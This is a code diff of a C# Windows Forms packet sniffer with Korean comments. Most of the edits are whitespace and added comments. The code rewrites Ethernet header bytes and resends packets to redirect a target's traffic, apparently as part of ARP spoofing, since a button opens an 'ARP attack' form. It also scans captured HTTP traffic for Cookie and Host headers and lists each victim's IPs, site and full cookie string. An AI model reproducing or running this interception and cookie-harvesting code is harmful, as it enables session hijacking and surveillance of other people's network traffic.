@@ -15,25 +15,22 @@ using PacketDotNet;
 using System.Threading;
 namespace Sniffer
 {
-    
-   
+
+
     public partial class Main : Form
     {
-        
+
         CaptureDeviceList selectedDevices;
         BaseInformation baseInformation;
-        Struct_Packet packet = new Struct_Packet();
-  
-
-
+      
 
         public Main()
         {
             InitializeComponent();
-            selectedDevices = CaptureDeviceList.Instance;
+            selectedDevices = CaptureDeviceList.Instance; //전체 네트워크 디바이스 리스트를 가져온다 
             baseInformation = new BaseInformation();
             baseInformation.getDefaultGateway();
-            setlistView();  
+            setlistView();
         }
         private void Icd_OnPacketArrival(object sender, CaptureEventArgs e)
         {
@@ -43,12 +40,12 @@ namespace Sniffer
             StringBuilder sb_packetSender = new StringBuilder();
             Packet tcpPacket;
             TcpPacket Packetinfo;
-           
+
             RawCapture packet = e.Packet;
-            
+
             //리다이렉트를 하는데
-            if (e.Packet.Data.Length < 29) return;
-            packet.Data[0] = 0x2c;
+            if (e.Packet.Data.Length < 29) return;      // 비정상적 패킷은 return한다
+            packet.Data[0] = 0x2c;                      // 패킷 리다이렉션을 위해 패킷을 하드코딩해서 실험중...
             packet.Data[1] = 0x21;
             packet.Data[2] = 0x72;
             packet.Data[3] = 0x93;
@@ -60,15 +57,12 @@ namespace Sniffer
             packet.Data[9] = 0x81;
             packet.Data[9] = 0x23;
             packet.Data[10] = 0x8d;
-            var addr = IPAddress.Parse(packet.Data[26] + "." + packet.Data[27] + "." +packet.Data[28] + "." +packet.Data[29]);
+            var addr = IPAddress.Parse(packet.Data[26] + "." + packet.Data[27] + "." + packet.Data[28] + "." + packet.Data[29]);
             if (BaseInformation.targetIpAddress == addr.ToString())
             {
                 BaseInformation.captureDevice.SendPacket(packet.Data);
             }
-            else
-            {
-                return;
-            }
+           
             try
             {
                 tcpPacket = Packet.ParsePacket(packet.LinkLayerType, packet.Data);
@@ -78,7 +72,7 @@ namespace Sniffer
             {
                 return;
             }
-            
+
             if (Packetinfo != null) //tcp일 경우 데이터 정보들을 뽑아 낸다.
             {
                 var ipPacket = (PacketDotNet.IpPacket)Packetinfo.ParentPacket;
@@ -90,45 +84,45 @@ namespace Sniffer
                 return;
             }
             for (int i = 0; i < packet.Data.Length - 10; i++)
+            {
+                if (packet.Data[i] == 'C' && packet.Data[i + 1] == 'o' && packet.Data[i + 2] == 'o' && packet.Data[i + 3] == 'k' && packet.Data[i + 4] == 'i' && packet.Data[i + 5] == 'e')
                 {
-                    if (packet.Data[i] == 'C' && packet.Data[i + 1] == 'o' && packet.Data[i + 2] == 'o' && packet.Data[i + 3] == 'k' && packet.Data[i + 4] == 'i' && packet.Data[i + 5] == 'e')
+                    for (int j = 0; j < packet.Data.Length - 10; j++)
                     {
-                        for (int j = 0; j < packet.Data.Length - 10; j++)
+                        if (packet.Data[j] == 'H' && packet.Data[j + 1] == 'o' && packet.Data[j + 2] == 's' && packet.Data[j + 3] == 't')
                         {
-                            if (packet.Data[j] == 'H' && packet.Data[j + 1] == 'o' && packet.Data[j + 2] == 's' && packet.Data[j + 3] == 't')
-                            {
-                                sb_Site = new System.Text.StringBuilder();
-                                sb_Site.Append(System.Text.Encoding.ASCII.GetChars(packet.Data, j, 20));
-                                break;
+                            sb_Site = new System.Text.StringBuilder();
+                            sb_Site.Append(System.Text.Encoding.ASCII.GetChars(packet.Data, j, 20));
+                            break;
 
-                            }
                         }
-                        ListViewItem lvi = new ListViewItem();
-                        System.Text.StringBuilder sb_Cookie = new System.Text.StringBuilder();
-                        System.Text.StringBuilder sb_SourceIp = new System.Text.StringBuilder();
-                        sb_Cookie.Append(System.Text.Encoding.ASCII.GetChars(packet.Data, i + 7, packet.Data.Length - i - 7));
-                        sb_SourceIp.Append(System.Text.Encoding.ASCII.GetChars(packet.Data, 26, 4));
-
-                        lvi.SubItems.Add(srcIP.ToString());
-                        lvi.SubItems.Add(dstIP.ToString());
-                        lvi.SubItems.Add(sb_Site.ToString());
-                        lvi.SubItems.Add(sb_Cookie.ToString());
-                        sb_Cookie.Clear();
-
-                        if (listView.InvokeRequired)
-                            listView.Invoke(new MethodInvoker(delegate
-                            {
-                                listView.Items.Add(lvi);
-
-                            }));
-                        else
-                            listView.Items.Add(lvi);
                     }
+                    ListViewItem lvi = new ListViewItem();
+                    System.Text.StringBuilder sb_Cookie = new System.Text.StringBuilder();
+                    System.Text.StringBuilder sb_SourceIp = new System.Text.StringBuilder();
+                    sb_Cookie.Append(System.Text.Encoding.ASCII.GetChars(packet.Data, i + 7, packet.Data.Length - i - 7));
+                    sb_SourceIp.Append(System.Text.Encoding.ASCII.GetChars(packet.Data, 26, 4));
+
+                    lvi.SubItems.Add(srcIP.ToString());
+                    lvi.SubItems.Add(dstIP.ToString());
+                    lvi.SubItems.Add(sb_Site.ToString());
+                    lvi.SubItems.Add(sb_Cookie.ToString());
+                    sb_Cookie.Clear();
+
+                    if (listView.InvokeRequired)
+                        listView.Invoke(new MethodInvoker(delegate
+                        {
+                            listView.Items.Add(lvi);
+
+                        }));
+                    else
+                        listView.Items.Add(lvi);
                 }
+            }
         }
         private void btn_capture_option_Click(object sender, EventArgs e)
         {
-            SelectDevices selectedDeviceForm = new SelectDevices();  
+            SelectDevices selectedDeviceForm = new SelectDevices();
             if (selectedDeviceForm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
             {
                 BaseInformation.captureDevice = selectedDevices[selectedDeviceForm.returnDeviceIndex];  //선택한 네트워크 인터페이스를 가져온다.
@@ -137,8 +131,8 @@ namespace Sniffer
             }
 
         }
-       
-       
+
+
         private void btn_capture_start_Click(object sender, EventArgs e)
         {
 
@@ -154,11 +148,11 @@ namespace Sniffer
             MessageBox.Show(test);
         }
 
-        private void btn_arp_attack_Click(object sender, EventArgs e)       
+        private void btn_arp_attack_Click(object sender, EventArgs e)
         {
             AttackList AttackListForm = new AttackList();
             AttackListForm.Show();
-   
+
         }
         private void setlistView()
         {
